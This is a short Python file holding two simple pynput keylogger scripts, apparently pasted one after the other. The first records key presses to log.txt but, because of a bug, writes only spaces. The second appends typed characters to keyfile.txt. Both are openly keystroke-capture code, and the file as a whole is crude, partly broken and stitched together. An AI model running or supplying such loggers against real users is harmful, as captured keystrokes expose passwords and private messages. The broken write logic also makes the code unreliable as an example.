import pynput
from pynput.keyboard import Key,Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try : 
        print('alphanumeric key {0} pressed' .format(key.char))
    except AttributeError:
        print('special key {0} pressed' .format(key))


def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f. write(' ')            

def on_release(key):
    print('{0} released'.format(key))
    if key == key.esc:
        return False
with Listener(on_press=on_press,
              on_release=on_release) as listener:
     listener.join()

from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
